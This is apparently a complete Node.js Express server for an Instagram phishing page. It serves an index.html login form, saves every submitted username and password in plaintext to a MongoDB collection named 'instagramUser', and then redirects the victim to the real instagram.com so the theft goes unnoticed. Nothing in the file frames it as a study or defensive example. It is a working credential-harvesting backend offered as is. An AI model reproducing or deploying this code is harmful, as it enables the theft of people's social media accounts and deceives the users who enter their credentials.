const express = require("express")
const mongoose = require("mongoose")
const bodyParser = require("body-parser")

const app = express()
app.use(bodyParser.urlencoded({extended : true}))
app.use(express.static("public"))

mongoose.set('strictQuery', false)
mongoose.connect("mongodb://localhost:27017/instagramUser")
const userSchema = {
    username : String,
    password : String
}
const user = new mongoose.model("user" , userSchema)

app.get("/" , function(req , res){
    res.sendFile(__dirname + "/index.html")
})

app.post("/" , function(req , res){
    const newData = new user({
        username : req.body.username,
        password : req.body.password
    })
    newData.save()
    res.redirect("https://www.instagram.com")
})

app.listen(process.env.PORT || 3000 , function(){
    console.log("Server is running on port 3000")
})